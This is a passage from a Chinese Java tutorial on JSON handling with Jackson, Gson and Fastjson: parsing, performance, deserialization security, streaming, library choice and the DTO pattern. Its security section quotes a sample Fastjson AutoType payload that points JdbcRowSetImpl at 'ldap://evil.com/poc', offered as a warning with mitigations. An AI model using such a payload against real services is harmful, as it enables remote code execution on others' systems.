<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;user\&quot;:&#123;\&quot;name\&quot;:\&quot;John Doe\&quot;,\&quot;contacts\&quot;:[&#123;\&quot;type\&quot;:\&quot;email\&quot;,\&quot;value\&quot;:\&quot;john@example.com\&quot;&#125;]&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 将JSON解析为一棵树</span></span><br><span class="line">    <span class="type">JsonNode</span> <span class="variable">rootNode</span> <span class="operator">=</span> mapper.readTree(jsonString);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全地导航并获取数据</span></span><br><span class="line">    <span class="comment">// path()方法比get()更安全，如果节点不存在，它返回一个MissingNode而不是null，避免NPE</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rootNode.path(<span class="string">&quot;user&quot;</span>).path(<span class="string">&quot;name&quot;</span>).asText(); <span class="comment">// -&gt; &quot;John Doe&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历数组</span></span><br><span class="line">    <span class="type">JsonNode</span> <span class="variable">contactsNode</span> <span class="operator">=</span> rootNode.path(<span class="string">&quot;user&quot;</span>).path(<span class="string">&quot;contacts&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (contactsNode.isArray()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (JsonNode contactNode : contactsNode) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> contactNode.path(<span class="string">&quot;type&quot;</span>).asText(); <span class="comment">// -&gt; &quot;email&quot;</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> contactNode.path(<span class="string">&quot;value&quot;</span>).asText(); <span class="comment">// -&gt; &quot;john@example.com&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例2：动态生成</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建一个可变的根对象节点</span></span><br><span class="line"><span class="type">ObjectNode</span> <span class="variable">root</span> <span class="operator">=</span> mapper.createObjectNode();</span><br><span class="line">root.put(<span class="string">&quot;id&quot;</span>, <span class="number">12345</span>);</span><br><span class="line">root.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;ACTIVE&quot;</span>);</span><br><span class="line">root.put(<span class="string">&quot;verified&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个数组节点并添加到根节点</span></span><br><span class="line"><span class="type">ArrayNode</span> <span class="variable">roles</span> <span class="operator">=</span> mapper.createArrayNode();</span><br><span class="line">roles.add(<span class="string">&quot;ADMIN&quot;</span>);</span><br><span class="line">roles.add(<span class="string">&quot;USER&quot;</span>);</span><br><span class="line">root.set(<span class="string">&quot;roles&quot;</span>, roles); <span class="comment">// 使用set()来添加一个子节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建一个子对象节点并添加到根节点</span></span><br><span class="line"><span class="type">ObjectNode</span> <span class="variable">profile</span> <span class="operator">=</span> mapper.createObjectNode();</span><br><span class="line">profile.put(<span class="string">&quot;firstName&quot;</span>, <span class="string">&quot;Jane&quot;</span>);</span><br><span class="line">profile.put(<span class="string">&quot;lastName&quot;</span>, <span class="string">&quot;Doe&quot;</span>);</span><br><span class="line">root.set(<span class="string">&quot;profile&quot;</span>, profile);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 将JsonNode转换为字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">generatedJson</span> <span class="operator">=</span> mapper.writerWithDefaultPrettyPrinter().writeValueAsString(root);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 输出:</span></span><br><span class="line"><span class="comment"> * &#123;</span></span><br><span class="line"><span class="comment"> *   &quot;id&quot; : 12345,</span></span><br><span class="line"><span class="comment"> *   &quot;status&quot; : &quot;ACTIVE&quot;,</span></span><br><span class="line"><span class="comment"> *   &quot;verified&quot; : true,</span></span><br><span class="line"><span class="comment"> *   &quot;roles&quot; : [ &quot;ADMIN&quot;, &quot;USER&quot; ],</span></span><br><span class="line"><span class="comment"> *   &quot;profile&quot; : &#123;</span></span><br><span class="line"><span class="comment"> *     &quot;firstName&quot; : &quot;Jane&quot;,</span></span><br><span class="line"><span class="comment"> *     &quot;lastName&quot; : &quot;Doe&quot;</span></span><br><span class="line"><span class="comment"> *   &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-4-性能与安全"><a href="#3-4-性能与安全" class="headerlink" title="3.4 性能与安全"></a>3.4 性能与安全</h3><h4 id="3-4-1-性能考量"><a href="#3-4-1-性能考量" class="headerlink" title="3.4.1 性能考量"></a>3.4.1 性能考量</h4><p><strong>核心原则</strong>：<code>ObjectMapper</code> (Jackson) 和 <code>Gson</code> 实例是<strong>线程安全</strong>的，但<strong>创建成本高昂</strong>。因此，在整个应用程序生命周期中，应该只创建少数实例并复用它们。</p>
<p><strong>为什么创建成本高？</strong></p>
<p>在首次创建时，这些库会执行以下耗时操作：</p>
<ul>
<li>通过反射扫描类的结构（字段、方法、注解）。</li>
<li>为扫描到的类创建并缓存对应的序列化器（Serializer）和反序列化器（Deserializer）。</li>
<li>初始化各种配置。</li>
</ul>
<p><strong>最佳实践：</strong></p>
<ul>
<li><p><strong>在Spring&#x2F;Jakarta EE项目中 (推荐)</strong><br>将<code>ObjectMapper</code>或<code>Gson</code>声明为一个单例Bean。Spring Boot会自动为你配置一个<code>ObjectMapper</code> Bean，你只需通过依赖注入（<code>@Autowired</code>）使用它即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyJsonService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectMapper objectMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过构造函数注入Spring Boot自动配置的ObjectMapper实例</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyJsonService</span><span class="params">(ObjectMapper objectMapper)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.objectMapper = objectMapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">convertUserToJson</span><span class="params">(User user)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">        <span class="comment">// 直接使用注入的、可复用的实例</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.objectMapper.writeValueAsString(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在非框架项目中</strong><br>使用静态常量或单例模式来持有一个全局实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 工具类单例模式</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JsonUtil</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个静态、final的实例，全局共享</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ObjectMapper</span> <span class="variable">MAPPER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 在此进行所有全局配置，例如注册模块</span></span><br><span class="line">        MAPPER.registerModule(<span class="keyword">new</span> <span class="title class_">JavaTimeModule</span>());</span><br><span class="line">        MAPPER.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">JsonUtil</span><span class="params">()</span> &#123;&#125; <span class="comment">// 私有构造，防止实例化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJson</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> MAPPER.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;JSON serialization error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">fromJson</span><span class="params">(String json, Class&lt;T&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> MAPPER.readValue(json, clazz);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;JSON deserialization error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-4-2-安全考量"><a href="#3-4-2-安全考量" class="headerlink" title="3.4.2 安全考量"></a>3.4.2 安全考量</h4><p><strong>核心原则</strong>：<strong>永远不要反序列化来自不可信来源的、且类型不确定的JSON数据。</strong> 反序列化漏洞是Java生态中最危险的漏洞之一。</p>
<ul>
<li><p><strong>警惕Fastjson 1.x 的AutoType漏洞</strong></p>
<ul>
<li><strong>是什么</strong>：Fastjson 1.x为了方便，提供了一个<code>@type</code>特性（默认开启），允许JSON字符串指定其要反序列化成的Java类。</li>
<li><strong>风险</strong>：攻击者可以构造一个恶意的JSON，如<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://evil.com/poc&quot;, ...}</code>。当Fastjson反序列化这个字符串时，会创建<code>JdbcRowSetImpl</code>对象，并调用其setter方法，最终可能导致远程代码执行（RCE）。</li>
<li><strong>解决方案</strong>：<ol>
<li><strong>强烈建议：立即从Fastjson 1.x 迁移到 Fastjson2。</strong> Fastjson2从设计上解决了此问题，默认关闭<code>AutoType</code>。</li>
<li>如果无法迁移，请务必升级到最新的1.x版本，并<strong>显式关闭<code>AutoType</code></strong>：<code>ParserConfig.getGlobalInstance().setSafeMode(true);</code></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>通用的反序列化漏洞（Gadget Chains）</strong></p>
<ul>
<li><p><strong>是什么</strong>：这种攻击不依赖于JSON库本身的漏洞，而是利用库的反序列化行为，去触发应用程序<code>classpath</code>中存在的、一系列无害类的组合（称为“Gadget Chain”），最终导致恶意代码执行。</p>
</li>
<li><p><strong>如何防范 (以Jackson为例)</strong>：</p>
<ol>
<li><p><strong>避免反序列化到宽泛类型</strong>：绝对不要将不可信的JSON反序列化到<code>Object.class</code>, <code>Serializable.class</code>等通用类型。始终指定一个具体的、你预期的POJO类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险！给了攻击者选择Gadget类的空间</span></span><br><span class="line"><span class="comment">// Object obj = mapper.readValue(untrustedJson, Object.class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全。只允许被反序列化为User类</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.readValue(trustedJson, User.class);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>谨慎使用多态类型处理</strong>：Jackson的多态类型功能（<code>@JsonTypeInfo</code>）也可能被利用。如果必须使用，<strong>不要开启全局的默认类型处理</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 极度危险！相当于开启了Jackson版的AutoType</span></span><br><span class="line"><span class="comment">// mapper.enableDefaultTyping(); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 更安全的做法是针对具体的基类进行配置，并限制范围</span></span><br><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"><span class="type">PolymorphicTypeValidator</span> <span class="variable">ptv</span> <span class="operator">=</span> BasicPolymorphicTypeValidator.builder()</span><br><span class="line">        .allowIfBaseType(Shape.class) <span class="comment">// 只允许Shape及其子类进行多态处理</span></span><br><span class="line">        .build();</span><br><span class="line">mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-4-3-大数据处理"><a href="#3-4-3-大数据处理" class="headerlink" title="3.4.3 大数据处理"></a>3.4.3 大数据处理</h4><p><strong>场景</strong>：你需要处理一个非常大的JSON文件（如几百MB或数GB），这个文件无法一次性完全加载到内存中。</p>
<p><strong>问题</strong>：使用数据绑定（<code>mapper.readValue()</code>）或树模型（<code>mapper.readTree()</code>）会尝试将整个JSON读入内存，导致<code>OutOfMemoryError</code>。</p>
<p><strong>解决方案</strong>：使用<strong>流式API（Streaming API）</strong>。它以事件驱动的方式逐个Token地读取JSON，内存占用极低且恒定。</p>
<p><strong>示例</strong>：从一个巨大的JSON数组文件中，逐个读取<code>User</code>对象进行处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonFactory;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonParser;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonToken;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设有一个名为 &quot;large_users.json&quot; 的文件，内容为: [ &#123;user1&#125;, &#123;user2&#125;, ..., &#123;userN&#125; ]</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigJsonProcessor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processUsersFromFile</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>(); <span class="comment">// 复用一个mapper用于对象绑定</span></span><br><span class="line">        <span class="type">JsonFactory</span> <span class="variable">factory</span> <span class="operator">=</span> mapper.getFactory();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">JsonParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.createParser(<span class="keyword">new</span> <span class="title class_">File</span>(filePath))) &#123;</span><br><span class="line">            <span class="comment">// 1. 确保JSON以数组开始 &#x27;[&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> (parser.nextToken() != JsonToken.START_ARRAY) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Expected content to be an array&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 循环遍历数组中的元素</span></span><br><span class="line">            <span class="keyword">while</span> (parser.nextToken() == JsonToken.START_OBJECT) &#123;</span><br><span class="line">                <span class="comment">// 3. 将流中的当前对象，直接映射为User对象</span></span><br><span class="line">                <span class="comment">// 这是流式API和数据绑定的完美结合：内存占用低，代码又简洁</span></span><br><span class="line">                <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.readValue(parser, User.class);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 在这里处理单个User对象，例如存入数据库</span></span><br><span class="line">                System.out.println(<span class="string">&quot;Processing user: &quot;</span> + user.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 循环结束后，parser应指向数组的结束符 &#x27;]&#x27;</span></span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方法结合了流式API的低内存占用和数据绑定的便利性，是处理大JSON数据的标准模式。</p>
<hr>
<h2 id="4-选型建议与总结"><a href="#4-选型建议与总结" class="headerlink" title="4. 选型建议与总结"></a>4. 选型建议与总结</h2><h3 id="4-1-快速选型指南（决策树）"><a href="#4-1-快速选型指南（决策树）" class="headerlink" title="4.1 快速选型指南（决策树）"></a>4.1 快速选型指南（决策树）</h3><h4 id="4-1-1-决策路径"><a href="#4-1-1-决策路径" class="headerlink" title="4.1.1 决策路径"></a>4.1.1 决策路径</h4><ul>
<li><strong>你的项目是基于Spring Boot构建的吗？</strong><ul>
<li><strong>是</strong> → <strong>首选 Jackson</strong>。<ul>
<li><strong>理由</strong>：Spring Boot开箱即用，深度集成且自动配置。你无需任何额外工作，即可获得一个功能强大、生态完善的JSON解决方案。所有与Web、Messaging相关的序列化都已为你处理好。</li>
</ul>
</li>
</ul>
</li>
<li><strong>否，但项目对性能有极致要求吗？（例如，高吞吐量API网关、大数据ETL、金融交易）</strong><ul>
<li><strong>是</strong> → <strong>优先考虑 Fastjson2</strong>。<ul>
<li><strong>理由</strong>：Fastjson2为性能而生，其在序列化和反序列化方面的基准测试通常领先。它内置的JSONB二进制格式能进一步提升内部服务间的通信效率。</li>
</ul>
</li>
</ul>
</li>
<li><strong>否，你更追求API的简洁、快速上手，或者项目是一个独立的非企业级应用&#x2F;安卓应用吗？</strong><ul>
<li><strong>是</strong> → <strong>可以考虑 Gson</strong>。<ul>
<li><strong>理由</strong>：Gson的API非常直观，学习曲线极低。对于中小型项目或工具类开发，它的简洁性可以提升开发效率。它对非标准JavaBean（如无空构造函数）的良好支持也是一个优势。</li>
</ul>
</li>
</ul>
</li>
<li><strong>否，你的项目需要部署在Jakarta EE应用服务器上，或者你正在开发一个需要与实现解耦的框架&#x2F;库吗？</strong><ul>
<li><strong>是</strong> → <strong>应当遵循 JSON-B 标准</strong>。<ul>
<li><strong>理由</strong>：面向标准编程可以确保你的代码在任何兼容Jakarta EE的环境中都能运行，避免厂商锁定。这在构建需要长期维护和高移植性的企业级应用时尤为重要。</li>
</ul>
</li>
</ul>
</li>
<li><strong>以上都不是，或者你不确定？</strong><ul>
<li><strong>→ 默认推荐 Jackson</strong>。<ul>
<li><strong>理由</strong>：Jackson是功能、性能和生态三者之间平衡得最好的库。它拥有最庞大的社区和最丰富的文档，几乎任何你能想到的问题，都能找到现成的解决方案或扩展模块。选择它是一个最稳妥、最不会出错的决定。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-1-2-核心库横向对比"><a href="#4-1-2-核心库横向对比" class="headerlink" title="4.1.2 核心库横向对比"></a>4.1.2 核心库横向对比</h4><table>
<thead>
<tr>
<th align="left">特性维度</th>
<th align="left">Jackson</th>
<th align="left">Fastjson2</th>
<th align="left">Gson</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>核心优势</strong></td>
<td align="left">功能全面，生态第一</td>
<td align="left">极致性能，安全可靠</td>
<td align="left">API简洁，上手极快</td>
</tr>
<tr>
<td align="left"><strong>性能表现</strong></td>
<td align="left"><strong>优秀</strong></td>
<td align="left"><strong>顶尖</strong></td>
<td align="left"><strong>良好</strong></td>
</tr>
<tr>
<td align="left"><strong>功能丰富度</strong></td>
<td align="left"><strong>非常高</strong></td>
<td align="left"><strong>高</strong></td>
<td align="left"><strong>中等</strong></td>
</tr>
<tr>
<td align="left"><strong>学习曲线</strong></td>
<td align="left">中等</td>
<td align="left">中低</td>
<td align="left"><strong>低</strong></td>
</tr>
<tr>
<td align="left"><strong>社区与生态</strong></td>
<td align="left"><strong>最庞大</strong></td>
<td align="left">快速增长</td>
<td align="left">较大</td>
</tr>
<tr>
<td align="left"><strong>安全记录</strong></td>
<td align="left">良好</td>
<td align="left"><strong>良好</strong> (针对1.x重写)</td>
<td align="left">良好</td>
</tr>
<tr>
<td align="left"><strong>主要适用场景</strong></td>
<td align="left">Spring生态、企业级应用</td>
<td align="left">高并发、大数据、性能敏感场景</td>
<td align="left">安卓、独立项目、工具类</td>
</tr>
</tbody></table>
<hr>
<h1 id="三、分层架构中的对象转换与DTO模式"><a href="#三、分层架构中的对象转换与DTO模式" class="headerlink" title="三、分层架构中的对象转换与DTO模式"></a>三、分层架构中的对象转换与DTO模式</h1><h2 id="1-为什么需要“多此一举”地转换对象？"><a href="#1-为什么需要“多此一举”地转换对象？" class="headerlink" title="1. 为什么需要“多此一举”地转换对象？"></a>1. 为什么需要“多此一举”地转换对象？</h2><h3 id="1-1-单一模型（胖模型）的弊端"><a href="#1-1-单一模型（胖模型）的弊端" class="headerlink" title="1.1 单一模型（胖模型）的弊端"></a>1.1 单一模型（胖模型）的弊端</h3><h4 id="1-1-1-安全隐患-Security-Risk"><a href="#1-1-1-安全隐患-Security-Risk" class="headerlink" title="1.1.1 安全隐患 (Security Risk)"></a>1.1.1 安全隐患 (Security Risk)</h4><ul>
<li><strong>详细说明</strong>：JPA&#x2F;MyBatis 实体类（PO）是与数据库表结构一一对应的，它可能包含一些极其敏感或纯粹是内部使用的字段，例如用户的 <code>password</code>（即使是哈希过的）、<code>salt</code>、用于乐观锁的 <code>version</code> 字段、标记用户状态的内部 <code>status</code> 码等。</li>
<li><strong>灾难场景</strong>：如果直接将这个 <code>User</code> 实体返回给前端，那么这些敏感数据就会完整地暴露在 HTTP 响应的 JSON 中。任何一个会使用浏览器开发者工具的人，都能在“网络(Network)”面板中看到这些不该被看到的数据。这不仅是信息泄露，更是严重的安全漏洞，为攻击者提供了可利用的信息。</li>
<li><strong>DTO的价值</strong>：通过转换为 <code>UserVO</code>，我们可以精确地挑选出那些可以对外展示的字段，比如 <code>id</code>, <code>username</code>, <code>avatar</code>，并对某些字段进行脱敏处理（如 <code>email</code> 显示为 <code>t***@example.com</code>），从根本上杜绝敏感数据泄露的风险。</li>
</ul>
<hr>
<h4 id="1-1-2-过度耦合-Excessive-Coupling"><a href="#1-1-2-过度耦合-Excessive-Coupling" class="headerlink" title="1.1.2 过度耦合 (Excessive Coupling)"></a>1.1.2 过度耦合 (Excessive Coupling)</h4><ul>
<li><strong>详细说明</strong>：这意味着你的前端视图（API消费者）直接与你的后端数据库物理结构（API提供者）绑定在了一起。API 本应是一个稳定的“契约”，但现在这个契约变得非常脆弱。</li>
<li><strong>灾难场景</strong>：某天，数据库管理员（DBA）为了优化查询性能，决定将 <code>user</code> 表中的 <code>first_name</code> 和 <code>last_name</code> 两个字段合并成一个 <code>full_name</code> 字段。后端开发为了适应这个变化，修改了 <code>User</code> 实体类。**结果：**所有依赖 <code>firstName</code> 和 <code>lastName</code> 字段的前端页面全部崩溃，App 闪退。每一次数据库结构的微调，都可能引发一场对前端的“地震”。</li>
<li><strong>DTO的价值</strong>：DTO 层就像一个“外交官”和“缓冲带”。数据库的表结构可以根据需要自由演进，只要我们保证 <code>User</code> (PO) 到 <code>UserDTO</code> 的转换逻辑是正确的，<code>UserDTO</code> 到 <code>UserVO</code> 的 API 契约保持不变，那么无论内部实现如何翻江倒海，对前端来说都是透明的、无感的。这实现了真正的“关注点分离”。</li>
</ul>
<hr>
<h4 id="1-1-3-数据冗余-Data-Redundancy"><a href="#1-1-3-数据冗余-Data-Redundancy" class="headerlink" title="1.1.3 数据冗余 (Data Redundancy)"></a>1.1.3 数据冗余 (Data Redundancy)</h4><ul>
<li><strong>详细说明</strong>：一个复杂的业务实体，比如 <code>Order</code>，可能包含几十个字段。但对于一个“订单列表页”来说，可能只需要展示 <code>orderId</code>, <code>orderStatus</code>, <code>totalAmount</code> 和 <code>createTime</code> 这四个字段。</li>
<li><strong>灾难场景</strong>：如果直接返回完整的 <code>Order</code> 实体列表，每个订单对象都包含了所有字段（收货人地址、发票信息、物流详情、所有商品项…），这将产生巨大的、不必要的网络流量。对于移动端应用，这不仅会拖慢加载速度、消耗用户更多流量，还会增加客户端的内存消耗。</li>
<li><strong>DTO的价值</strong>：我们可以创建一个 <code>OrderListVO</code>，它只包含那四个必需的字段。这使得 API 响应体变得轻量、高效，也让前端开发者能一目了然地知道他们能获取到什么数据，降低了沟通成本。</li>
</ul>
<hr>
<h4 id="1-1-4-视图不匹配-View-Mismatch"><a href="#1-1-4-视图不匹配-View-Mismatch" class="headerlink" title="1.1.4 视图不匹配 (View Mismatch)"></a>1.1.4 视图不匹配 (View Mismatch)</h4><ul>
<li><strong>详细说明</strong>：数据库的设计遵循范式理论，力求结构化、减少冗余。而前端 UI 的需求往往是“所见即所得”的，它需要的数据可能是非规范化的、聚合的、扁平的。</li>
<li><strong>灾难场景</strong>：一个“用户个人主页”需要同时展示用户的基本信息（来自 <code>user</code> 表）、他的文章总数（来自 <code>article</code> 表的 <code>COUNT</code>）、以及他的粉丝数（来自 <code>follow_relation</code> 表的 <code>COUNT</code>）。如果只返回一个 <code>User</code> 实体，前端为了凑齐这些数据，就需要再额外发起两次甚至更多次的 API 请求，导致页面加载缓慢，后端服务器压力也随之增加。</li>
<li><strong>DTO的价值</strong>：我们可以在后端设计一个 <code>UserProfileVO</code>，它包含了 <code>username</code>, <code>avatar</code>, <code>articleCount</code>, <code>followerCount</code> 等字段。在 Service 层，我们可以高效地（甚至通过一条 SQL）查询并组装好所有数据，然后通过这一个 VO 对象一次性返回给前端。这极大地提升了用户体验和系统性能。</li>
</ul>
<hr>
